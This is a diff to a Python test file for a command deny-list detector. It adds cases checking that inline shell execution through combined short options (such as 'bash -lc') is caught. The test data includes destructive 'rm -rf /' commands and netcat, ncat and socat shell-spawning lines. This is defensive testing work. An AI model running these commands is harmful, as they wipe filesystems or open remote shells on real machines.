@@ -342,6 +342,17 @@ def test_detect_fork_bomb(argv: tuple[str, ...]) -> None:
         ("nc", "-l", "1234"),
         ("ncat", "-e", "/bin/sh", "host", "1234"),
         ("socat", "TCP-LISTEN:1234", "EXEC:/bin/sh"),
+        # Codex PR #1 R1 F-PR1-001 P1 adopt: combined short option group with `c`
+        # (`bash -lc 'cmd'` / `sh -ec 'cmd'` / `zsh -ilc 'cmd'` etc.) も inline exec
+        # として deny する。`-` + chars で combine 可能な POSIX shell short option。
+        ("bash", "-lc", "rm -rf /"),
+        ("sh", "-ec", "rm -rf /"),
+        ("zsh", "-ilc", "rm -rf /"),
+        ("bash", "-ic", "rm -rf /"),
+        ("dash", "-c", "rm -rf /"),
+        # long option + combined short
+        ("bash", "--norc", "-c", "rm -rf /"),
+        ("bash", "--norc", "-lc", "rm -rf /"),
     ),
 )
 def test_detect_inline_exec(argv: tuple[str, ...]) -> None:
